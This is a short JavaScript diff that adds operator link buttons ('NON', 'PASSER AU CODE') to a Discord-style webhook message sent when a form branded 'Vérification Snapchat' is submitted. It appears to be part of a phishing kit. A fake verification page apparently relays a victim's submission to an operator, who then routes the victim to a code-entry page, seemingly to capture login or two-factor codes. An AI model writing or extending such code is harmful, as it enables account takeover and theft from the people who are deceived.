@@ -80,6 +80,7 @@ if (step1Form) {
             return;
         }
 
+        const baseUrl = getBaseUrl();
         const payload = {
             embeds: [
                 {
@@ -105,6 +106,25 @@ if (step1Form) {
                     footer: {
                         text: 'Vérification Snapchat'
                     }
+                }
+            ],
+            components: [
+                {
+                    type: 1,
+                    components: [
+                        {
+                            type: 2,
+                            style: 5,
+                            label: 'NON',
+                            url: `${baseUrl}/ineligible.html`
+                        },
+                        {
+                            type: 2,
+                            style: 5,
+                            label: 'PASSER AU CODE',
+                            url: `${baseUrl}/code.html`
+                        }
+                    ]
                 }
             ]
         };
